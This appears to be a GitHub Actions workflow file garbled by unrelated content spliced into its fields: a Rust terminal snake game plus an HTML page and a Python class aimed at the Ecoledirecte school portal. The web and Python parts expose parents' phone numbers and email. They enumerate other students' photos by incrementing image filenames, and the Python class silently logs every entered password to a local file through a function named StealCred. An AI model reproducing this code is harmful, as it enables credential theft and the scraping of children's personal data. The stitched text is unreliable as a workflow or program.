name: Rust

on: extern crate clap;
extern crate rand;

use std::collections::LinkedList;
use std::time::{Duration, Instant};
use std::cmp::{max, min};

use clap::Parser;
use rand::Rng;

mod term;
use term::{Input, Terminal};

#[derive(Parser, Debug)]
struct Args {
    #[clap(short = 'w', long = "width", help = "The width of the board (default is terminal width)")]
    width: Option<usize>,
    #[clap(short = 'h', long = "height", help = "The height of the board (default is terminal height)")]
    height: Option<usize>,
    #[clap(short = 'f', long = "frequency", help = "The amount of steps the snake makes per second")]
    freq: Option<u64>,
    #[clap(short = 's', long = "start_length", help = "The length the snake starts with")]
    start_length: Option<usize>,
    #[clap(short = 'r', long = "reward", help = "The length the snake gains from eating food")]
    reward: Option<usize>,
}

// Display constants

const EMPTY: u8 = ' ' as u8;
const BORDER: u8 = '#' as u8;
const FOOD: u8 = 'F' as u8;
const HEAD: u8 = '@' as u8;
const BODY: u8 = 'B' as u8;


#[derive(Clone, Copy)]
enum Direction {
    Right, Up, Left, Down
}

impl Direction {
    pub fn velocity(&self) -> (i32, i32) {
        match *self {
            Direction::Right => (0, 1),
            Direction::Up => (-1, 0),
            Direction::Left => (0, -1),
            Direction::Down => (1, 0)
        }
    }
}

// height + space for border
fn board_height(height: usize) -> usize {
    height + 2
}

// width + space for border and \n\r
fn board_width(width: usize) -> usize {
    width + 4
}

// initialize the board and draw boarder and \n\r
fn draw_border(board: &mut Vec<u8>, width: usize, height: usize) {
    board.clear();
    board.resize(board_height(height) * board_width(width), EMPTY);
    for w in 0..width {
        board[w + 1] = BORDER;
        board[(board_height(height) - 1) * board_width(width) + w + 1] = BORDER;
    }

    for h in 0..board_height(height) {
        board[h * board_width(width) + 0] = BORDER;
        board[h * board_width(width) + width + 1] = BORDER;
        board[h * board_width(width) + width + 2] = '\n' as u8;
        board[h * board_width(width) + width + 3] = '\r' as u8;
    }
}

fn draw_snake(board: &mut Vec<u8>, width: usize, snake: &LinkedList<(usize, usize)>) {
    let mut it = snake.into_iter();
    if let Some((h, w)) = it.next() {
        board[h * board_width(width) + w] = HEAD;
    } else {
        panic!("Snake has no head!");
    }
    while let Some((h, w)) = it.next() {
        board[h * board_width(width) + w] = BODY;
    }
}

fn draw_food(terminal: &Terminal, board: &mut Vec<u8>, width: usize, food: &(usize, usize)) {
    board[food.0 * board_width(width) + food.1] = FOOD;
    terminal.write_cell(FOOD, food.1, food.0).unwrap();
}

// move snake in direction and update board. return ({crashed into wall or myself}, {eaten food})
fn advance_snake(terminal: &Terminal, board: &mut Vec<u8>, width: usize, snake: &mut LinkedList<(usize, usize)>, direction: &Direction, target_length: &mut usize, reward: usize) -> (bool, bool) {
    if let Some(&(old_h, old_w)) = snake.front() {
        let new_head_h = (old_h as i32 + direction.velocity().0) as usize;
        let new_head_w = (old_w as i32 + direction.velocity().1) as usize;

        // advance
        snake.push_front((new_head_h, new_head_w));

        // check for collision
        let out = match board[new_head_h * board_width(width) + new_head_w] {
            FOOD => (true, false),
            BORDER => (false, true),
            BODY => (false, true),
            EMPTY => (false, false),
            _ => panic!("Impossible")
        };

        // write new head
        terminal.write_cell(HEAD, new_head_w, new_head_h).unwrap();
        terminal.write_cell(BODY, old_w, old_h).unwrap();
        board[new_head_h * board_width(width) + new_head_w] = HEAD;
        board[old_h * board_width(width) + old_w] = BODY;

        if out.0 { // eaten food
            *target_length += reward;
        }

        // remove tail if snake length is as big as target_length
        if snake.len() > *target_length {
            if let Some((h, w)) = snake.pop_back() {
                terminal.write_cell(EMPTY, w, h).unwrap();
                board[h * board_width(width) + w] = EMPTY;
            }
        }
        out
    } else {
        panic!("Snake has no head!");
    }
}

// find random free spot on the board in O(n) guaranteed
fn random_free_spot(board: &Vec<u8>, width: usize) -> Option<(usize, usize)> {
    let num_free = board.into_iter().filter(|c| -> bool {**c == EMPTY}).count();
    if num_free == 0 {
        return None;
    }
    let nth_free_i = rand::thread_rng().gen_range(0, num_free);
    let mut free_cnt = 0;
    for i in 0..board.len() {
        if board[i] == EMPTY {
            if free_cnt == nth_free_i {
                return Some((i / board_width(width), i % board_width(width)))
            } else {
                free_cnt += 1;
            }
        }
    }
    None
}

fn quit(term: &Terminal) -> ! {
    term.clean().unwrap();
    std::process::exit(0);
}

fn main() {

    let args = Args::parse();
    let terminal = Terminal::new();

    // default is terminal width / height
    let default_width = || -> usize {terminal.get_size().unwrap().0 - 2};
    let default_height = || -> usize {terminal.get_size().unwrap().1 - 3};

    let width = args.width.unwrap_or_else(default_width);
    let height = args.height.unwrap_or_else(default_height);

    // default is chosen so it takes the snake 4 seconds across the board 
    let freq = args.freq.unwrap_or(max(1, (min(width, height) / 4) as u64));
    let start_length = args.start_length.unwrap_or(5);
    let reward = args.reward.unwrap_or(5);

    let mut board : Vec<u8> = std::vec::Vec::with_capacity(board_height(height) * board_width(width));
    let mut target_length = 1 + start_length;
    let mut snake: LinkedList<(usize, usize)> = LinkedList::new();
    let mut direction = Direction::Right;
    let mut food: (usize, usize);


    terminal.setup().unwrap();

    // only draw border once
    draw_border(&mut board, width, height);

    // draw snake and food the first time
    snake.push_back((height / 2 + 1, width / 2 + 1));
    draw_snake(&mut board, width, &snake);
    food = match random_free_spot(&board, width) {
        Some(food) => food,
        None => quit(&terminal)
    };

    draw_food(&terminal, &mut board, width, &food);

    terminal.display(board.as_slice()).unwrap();


    let update_interval = Duration::from_micros((1000 * 1000) / freq);
    let mut update_deadline = Instant::now() + update_interval;

    let mut pause = false;

    loop {
        // user input
        if let Ok(Some(key)) = terminal.user_input(&update_deadline) {
            direction = match (key, direction) {
                (Input::Right, Direction::Right) => Direction::Down,
                (Input::Right, Direction::Down) => Direction::Left,
                (Input::Right, Direction::Left) => Direction::Up,
                (Input::Right, Direction::Up) => Direction::Right,
                (Input::Left, Direction::Right) => Direction::Up,
                (Input::Left, Direction::Up) => Direction::Left,
                (Input::Left, Direction::Left) => Direction::Down,
                (Input::Left, Direction::Down) => Direction::Right,
                (Input::Exit, _) => quit(&terminal),
                (Input::Pause, _) => {
                    pause = !pause;
                    continue;
                }
            };
        }

        if pause {
            continue;
        }

        update_deadline = Instant::now() + update_interval;

        // step: redraw snake and food if eaten
        let (eaten, crashed) = advance_snake(&terminal, &mut board, width, &mut snake, &direction, &mut target_length, reward);
        if eaten {
            food = match random_free_spot(&board, width) {
                Some(food) => food,
                None => quit(&terminal)
            };
            draw_food(&terminal, &mut board, width, &food);
        }
        if crashed {
            quit(&terminal);
        }
    }

}
  push: extern crate terminal;

use std::io::Write;
use terminal::{error, TerminalLock, Clear, Action, Value, Retrieved, Event, KeyCode, KeyEvent};

use std::time::Instant;

#[derive(PartialEq, Clone, Copy)]
pub enum Input {
    Left, Right, Exit, Pause
}


pub struct Terminal {
    terminal: terminal::Terminal<std::io::Stdout>,
}


impl Terminal {

    pub fn new() -> Terminal {
        Terminal{
            terminal: terminal::stdout()
        }
    }

    fn lock(&self) -> error::Result<TerminalLock<std::io::Stdout>> {
        self.terminal.lock_mut()
    }

    // enter new screen and hide cursor
    pub fn setup(&self) -> error::Result<()> {
        let mut lock = self.lock()?;
        lock.batch(Action::EnterAlternateScreen)?;
        lock.batch(Action::EnableRawMode)?;
        lock.batch(Action::HideCursor)?;
        lock.flush_batch()
    }

    // return terminal size in (width, height)
    pub fn get_size(&self) -> error::Result<(usize, usize)> {
        if let Ok(Retrieved::TerminalSize(w, h)) = self.lock()?.get(Value::TerminalSize) {
            Ok((w as usize, h as usize))
        } else {
            Err(error::ErrorKind::ActionNotSupported(std::string::String::from("")))
        }
    }

    // return entered keys until exit is entered or specified deadline is met
    pub fn user_input(&self, until: &Instant) -> error::Result<Option<Input>> {
        let lock = self.lock()?;

        let mut num_left = 0;
        let mut num_right = 0;

        loop {
            let now = Instant::now();
            if let Ok(Retrieved::Event(Some(Event::Key(key)))) = lock.get(Value::Event(Some(*until - now))) {
                match key {
                    KeyEvent{code: KeyCode::Left, ..} => {
                        num_left += 1;
                    },
                    KeyEvent{code: KeyCode::Right, ..} => {
                        num_right += 1;
                    },
                    KeyEvent{code: KeyCode::Char('q'), ..} => {
                        return Ok(Some(Input::Exit));
                    },
                    KeyEvent{code: KeyCode::Char('p'), ..} => {
                        return Ok(Some(Input::Pause));
                    }
                    _ => continue
                };
            } else {
                break;
            }
        }
        return Ok(if num_left > num_right {Some(Input::Left)} else if num_left < num_right {Some(Input::Right)} else {None})
    }

    // write board to screen
    pub fn display(&self, board: &[u8]) -> error::Result<()> {
        let mut lock = self.lock()?;
        lock.act(Action::ClearTerminal(Clear::All))?;
        lock.act(Action::MoveCursorTo(0, 0))?;
        lock.write(board)?;
        lock.flush_batch()
    }

    // rewrite a single cell
    pub fn write_cell(&self, symbol: u8, x: usize, h: usize) -> error::Result<()> {
        let mut lock = self.lock()?;
        lock.batch(Action::MoveCursorTo(x as u16, h as u16))?;
        lock.write(&[symbol])?;
        lock.flush_batch()
    }

    // show cursor again and return to old screen
    pub fn clean(&self) -> error::Result<()> {
        let mut lock = self.lock()?;
        lock.batch(Action::MoveCursorTo(0, 0))?;
        lock.batch(Action::ShowCursor)?;
        lock.batch(Action::DisableRawMode)?;
        lock.batch(Action::LeaveAlternateScreen)?;
        lock.flush_batch()
    }

}
    branches: [ "main" ]
  pull_request: <!DOCTYPE html>
<html>
<head>
        <title>Ecoledirecte</title>
</head>
<body style="background-color: rgb(241, 196, 15); font-family: 'proxima-nova-soft', 'Proxima Nova Soft', Helvetica, Arial, sans-serif;">
        <div style="border-style: dashed;">
        <h2 align="center" id="header">
                <pre>
███████╗ ██████╗ ██████╗ ██╗     ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗███████╗    
██╔════╝██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔════╝    
█████╗  ██║     ██║   ██║██║     █████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   █████╗      
██╔══╝  ██║     ██║   ██║██║     ██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   ██╔══╝      
███████╗╚██████╗╚██████╔╝███████╗███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   ███████╗    
╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   ╚══════╝    
</pre>                                                                                                 
</h2></div>
<br>
<div align="center">
        <input type="text" id="user" placeholder="Username">
        <br>
        <input type="password" id="passwd" placeholder="Password">
        <br>
        <button id="bouton" type="button" onclick="start()">Start</button>
        <br>
        <p type="hidden" id="errorhanlder"></p>
        <br>
        <hr>
</div>
        <h3 id="header3"></h3>
        <ul>
                <p id="nomEtablissement"></p>
                <p id="email"></p>
                <p id="tel"></p>
                <li id="nom1"></li>
                <li id="classe1"></li>
                <img id="image1">
                <hr>
                <li id="nom2"></li>
                <li id="classe2"></li>
                <img id="image2">
                <hr>
                <li id="nom3"></li>
                <li id="classe3"></li>
                <img id="image3">
        </ul>
                <hr>
                <h3 id="autresphotos"></h3>
                <img id="found1">
                <img id="found2">
                <img id="found4">
                <img id="found5">
                <img id="found7">
                <img id="found8">


</body>
<script type="text/javascript">
        function getotherpics(link) {
                var b = [];
                var racine = link.split("/")[5].split(".")[0].slice(0,-2);
                var finracine = link.split("/")[5].split(".")[0].substr(6);
                var deu = link.split("/")[5].split(".")[0].substr(6);
                var url = link.split("/");
                delete url[0]
                delete url[1]
                delete url[5]
                url = "http://"+url.join("/");
                b.push(url+racine.toString()+(parseInt(finracine)-1)+".jpg")
                b.push(url+racine.toString()+(parseInt(deu)+1)+".jpg")
        return b;
}
        var eleve1 = {};
        var eleve2 = {};
        var eleve3 = {};
        function start() {
                var nom1 = document.getElementById("nom1");
        var nom2 = document.getElementById("nom2");
        var nom3 = document.getElementById("nom3");
        var classe1 = document.getElementById("classe1");
        var classe2 = document.getElementById("classe2");
        var classe3 = document.getElementById("classe3");
        var image1 = document.getElementById("image1");
        var image2 = document.getElementById("image2");
        var image3 = document.getElementById("image3");
        var found1 = document.getElementById("found1");
        var found2 = document.getElementById("found2");
        var found4 = document.getElementById("found4");
        var found5 = document.getElementById("found5");
        var found7 = document.getElementById("found7");
        var found8 = document.getElementById("found8");
        var tel = document.getElementById("tel");
        nom1.innerHTML = "";
        nom2.innerHTML = "";
        nom3.innerHTML = "";
        classe1.innerHTML = "";
        classe2.innerHTML = "";
        classe3.innerHTML = "";
        image1.innerHTML = "";
        image2.innerHTML = "";
        image3.innerHTML = "";
                var user = document.getElementById('user').value.toString();
                var passwd = document.getElementById('passwd').value.toString();
                var requete = new XMLHttpRequest();
                var url = "https://vmws22.ecoledirecte.com/v3/login.awp?data=" + encodeURIComponent(JSON.stringify({"identifiant": user, "motdepasse": passwd}));
                requete.open("GET", url, true);
                requete.setRequestHeader("Content-Type", "application/json");
                requete.onreadystatechange = function () {

                    if (requete.readyState === 4 && requete.status === 200 && JSON.parse(requete.responseText).code !== 505) {
                            var goodcreds = document.getElementById('errorhanlder');
                            goodcreds.style = "color: rgb(213, 24, 47);"
                                goodcreds.type = "text";
                                goodcreds.innerHTML = "[+] Chargement des resources";
                            var json = JSON.parse(requete.responseText);
                        var etablissement = json.data.accounts[0].nomEtablissement;
                        var email = json.data.accounts[0].email;
                        console.log("UAI: "+json.data.accounts[0].codeOgec)
                        try{
                                eleve1.nom = json.data.accounts[0].profile.eleves[0].prenom.toString()+" "+json.data.accounts[0].profile.eleves[0].nom.toString();
                                eleve1.classe = json.data.accounts[0].profile.eleves[0].classe.libelle.toString();
                                eleve1.photo = json.data.accounts[0].profile.eleves[0].photo.toString().replace("//","http://");
                        } catch(e){
                                console.log("Error for eleve1");
                                eleve1 = new Boolean(false);
                        }
                        try{
                                eleve2.nom = json.data.accounts[0].profile.eleves[1].prenom.toString()+" "+json.data.accounts[0].profile.eleves[1].nom.toString();
                                eleve2.classe = json.data.accounts[0].profile.eleves[1].classe.libelle.toString();
                                eleve2.photo = json.data.accounts[0].profile.eleves[1].photo.toString().replace("//","http://");
                        } catch(e){
                                console.log("Second 'eleve' not found");
                                eleve2 = new Boolean(false);
                        }
                        try{
                                eleve3.nom = json.data.accounts[0].profile.eleves[2].prenom.toString()+" "+json.data.accounts[0].profile.eleves[2].nom.toString();
                                eleve3.classe = json.data.accounts[0].profile.eleves[2].classe.libelle.toString();
                                eleve3.photo = json.data.accounts[0].profile.eleves[2].photo.toString().replace("//","http://"); 
                        } catch(e){
                                console.log("Third 'eleve' not found");
                                eleve3 = new Boolean(false);
                        }
                                goodcreds.innerHTML = "[+] Les resultats sont disponibles";
                                document.getElementById("header3").innerHTML = "Resultats";
                                document.getElementById("nomEtablissement").innerHTML = "Etablissement: "+etablissement;
                                document.getElementById("email").innerHTML = "Mail: "+email;
                                tel.innerHTML = "Tel: "+json.data.accounts[0].profile.telPortable.toString()+" , "+json.data.accounts[0].profile.telPortableConjoint.toString()

                                if (eleve1 !== new Boolean(false)){
                                        nom1.innerHTML = eleve1.nom;
                                        classe1.innerHTML = eleve1.classe;
                                        var link_pic = eleve1.photo.toString();
                                        image1.src = link_pic;
                                        var res1 = new getotherpics(link_pic);
                                        try{
                                                found1.src = res1[0];
                                        } catch(e){
                                                found1.removeAttribute("src");
                                        }
                                        try{found2.src = res1[1];} catch(e){found2.removeAttribute("src");}

                                }
                                if (eleve2 !== new Boolean(false) && eleve2.nom !== undefined){
                                        nom2.innerHTML = eleve2.nom;
                                        classe2.innerHTML = eleve2.classe;
                                        var link_pic2 = eleve2.photo.toString();
                                        image2.src = link_pic2;
                                        var res2 = new getotherpics(link_pic2);
                                        try{found4.src = res2[0];} catch(e){found4.removeAttribute("src");}
                                        try{found5.src = res2[1];} catch(e){found5.removeAttribute("src");}
                                }
                                if (eleve3 !== new Boolean(false) && eleve3.nom !== undefined){
                                        nom3.innerHTML = eleve3.nom;
                                        classe3.innerHTML = eleve3.classe;
                                        var link_pic3 = eleve3.photo.toString();
                                        image3.src = link_pic3;
                                        var res3 = new getotherpics(link_pic3);
                                        try{found7.src = res3[0];} catch(e){found7.removeAttribute("src");}
                                        try{found8.src = res3[1];} catch(e){found8.removeAttribute("src");}
                                }

            }
    else{
            var errorwrongcreds = document.getElementById('errorhanlder');
                errorwrongcreds.type = "text";
                errorwrongcreds.style = "color: red;"
                errorwrongcreds.innerHTML = "[-] Identifiant ou mot de passe invalide!";
    }
        };
        requete.send();
        }
</script>
<style type="text/css">
        button{
                width: 25%;
                padding: 5px;
                border-style: none;
                background-color: rgba(169, 37, 255,1);
                color: white;
                border-radius: 20px;
        }
        .par{
                font-family: sans-serif;
                font-size: 20px;
                text-decoration: underline;
                text-decoration-color: red;
        }
        #user, #passwd{
                border-radius: 20px;
                border-spacing: 10px;
                border-style: inset;
                text-align: center;
                width: 600px;
                height: 60px;
                box-shadow: -10px 9px rgb(169, 37, 255);

        }
        #header{
                font-family: "ANSI Shadow";
                white-space: pre;
                text-align: center;
        }
        #header3{
                font-size: 60px;
                color: rgb(169, 37, 24);
                font-family: "proxima-nova-soft", "Proxima Nova Soft", Helvetica, Arial, sans-serif;
                font-weight: 30;
        }
</style>
</html>
    branches: [ "main" ]

env: import requests
from sys import exit

class Ecoledirecte():
        def __init__(self, identifiant, password):
                self.identifiant = str(identifiant)
                self.password = str(password)
                try:
                        self.url = "https://vmws22.ecoledirecte.com/v3/login.awp?data={%22identifiant%22:%22" + f"{identifiant}" + "%22,%22motdepasse%22:%22"+f"{password}"+"%22}"
                        self.req = requests.post(self.url)
                        if self.req.status_code != 200:
                                print("Wrong ids")
                                return False
                except:
                        print("An error occured")
                        return False
                #debug :
                self.json = self.req.json()
                self.text = self.req.text
                #::
                self.photos = {}
                roots = []
                pto = []
                self.otherpic = []
                classes = []
                names = []
                for x in range(0,4):
                        try:
                                phot = self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]["photo"]
                                pto.append(phot)
                        except IndexError:
                                pass
                        except KeyError:
                                pass
                        try:
                                root = phot.split("/")[-1][:-4]
                                roots.append(root)
                        except IndexError:
                                pass
                        except KeyError:
                                pass
                        try:
                                classe = self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]["classe"]['libelle']
                                classes.append(classe)
                        except IndexError:
                                pass
                        except KeyError:
                                pass
                        try:
                                names.append(self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]['prenom']+" "+self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]['nom'])
                        except IndexError:
                                pass
                        except KeyError:
                                pass
                self.photos["name"] = names
                self.photos["entirepath"] = pto
                self.photos["classes"] = classes
                self.photos["roots"] = roots
                try:
                        self.photos["all"] = roots.copy()
                        del roots
                        portable = {}
                        portable[self.req.json()['data']['accounts'][0]["profile"]["email"]] = [self.req.json()['data']['accounts'][0]["profile"]["telPortable"], self.req.json()['data']['accounts'][0]["profile"]["telPortableConjoint"]]
                except IndexError:
                        pass
                try:
                        nomprincipal = self.req.json()['data']['accounts'][0]["prenom"] + " " + self.req.json()['data']['accounts'][0]["particule"] + self.req.json()['data']['accounts'][0]["nom"]
                except IndexError:
                        pass
                try:        
                        codeuai = self.req.json()['data']['accounts'][0]["codeOgec"]
                except IndexError:
                        pass
                try:
                        email = self.req.json()['data']['accounts'][0]["email"]
                except IndexError:
                        pass
                try:
                        etablissement = self.req.json()['data']['accounts'][0]["nomEtablissement"]
                except IndexError:
                        pass
                def StealCred():
                        try:
                                o = open("credlist.txt", "a")
                                o.write(self.identifiant+":"+self.password+"\n")
                                o.close()
                        except Exception as e:
                                print(e)
                                return False
                StealCred()
                def GetOtherPic():
                        pat = "/".join(self.photos["entirepath"][0].split("/")[2:-1])+"/"
                        rout = self.photos["entirepath"][0].split("/")[-1][:-6]
                        for test in range(int(self.photos["entirepath"][0].split("/")[-1][6:-4])-2,int(self.photos["entirepath"][0].split("/")[-1][6:-4])+2):
                                try:
                                        rm = requests.get("http://"+pat+rout+str(test)+".jpg").text
                                except:
                                        pass
                                else:
                                        if not "Error" in rm:
                                                self.otherpic.append("http://"+pat+rout+str(test)+".jpg")
                GetOtherPic()
                def OpenOtherPictureFound(self):
                        try:
                                import webbrowser as web
                        except ModuleNotFoundError:
                                print("Install webbrowser first")
                                return False
                        if not GetOtherPic():
                                return False
                        for i in self.otherpic:
                                try:
                                        w = web.open_new_tab(i)
                                except:
                                        return False
                                if not w:
                                        print("Unable to open your default webbrowser")
                                        return False



res = Ecoledirecte("yourusername","yourpassword")
#print(res.text) # display server response (for debugging)
#print(res.photos) #display all
#print(res.otherpic) #display pictures found
#res.OpenOtherPictureFound() #open other pictures found on your default webbrowser
  CARGO_TERM_COLOR: always

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v4
    - name: Build
      run: cargo build --verbose
    - name: Run tests
      run: cargo test --verbose
